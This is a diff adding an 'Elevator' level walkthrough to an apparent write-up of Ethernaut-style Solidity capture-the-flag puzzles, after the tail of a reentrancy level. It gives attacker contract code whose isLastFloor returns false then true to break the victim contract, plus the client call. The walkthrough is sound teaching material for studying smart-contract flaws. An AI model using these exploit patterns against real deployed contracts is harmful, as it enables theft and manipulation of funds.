@@ -406,4 +406,67 @@ await sendTransaction({ to: attackerContract.address, value: 1000000000000000 })
 
 This line will trigger the `receive` function on our attacker contract and start the recursion. Once the victim balance is zero, the `receive` function will return.
 
+---
 
+### 11. Elevator
+
+In this level we have an `Elevator` contract that (supposedly) does not allow to reach the last floor of the `Building` that calls it.
+The `Elevator` delegates the caller contract the implementation of the `isLastFloor` function.
+
+```sol
+function goTo(uint _floor) public {
+  Building building = Building(msg.sender);
+
+  if (! building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+  }
+}
+```
+
+Note that we can break the contract when the `isLastFloor` function is not deterministic. Meaning, the same input will not produce the same output each time.
+
+Since the abstract function to be implemented does not clarify any state permission like `pure` or `view` we can implement whatever logic we want inside the malicious `isLastFloor` function.
+
+```sol
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+```
+
+This way we can create an implementation `isLastFloor` function that returns `false` in the first call and `true` in the second one in order to reach the last floor. You can see the full contract code [here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).
+
+```sol
+function isLastFloor(uint floor) public returns (bool) {
+  if (floor == last) {
+    if (firstTry) {
+      // sets the first try variable 
+      // to false and returns false
+      firstTry = false;
+      return false;
+    } else {
+      // resets the first try variable
+      // and returns true
+      firstTry = true;
+      return true;
+    }
+  }
+  // defaults to false
+  return false;
+}
+```
+
+We can create a function that hacks the elevator as follows:
+
+```sol
+function goToLast() public {
+  Elevator(victim).goTo(last);
+}
+```
+Then we just call this function from our client as:
+
+```js
+await myContract.goToLast();
+```
+
+And we are done, [see the full code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).
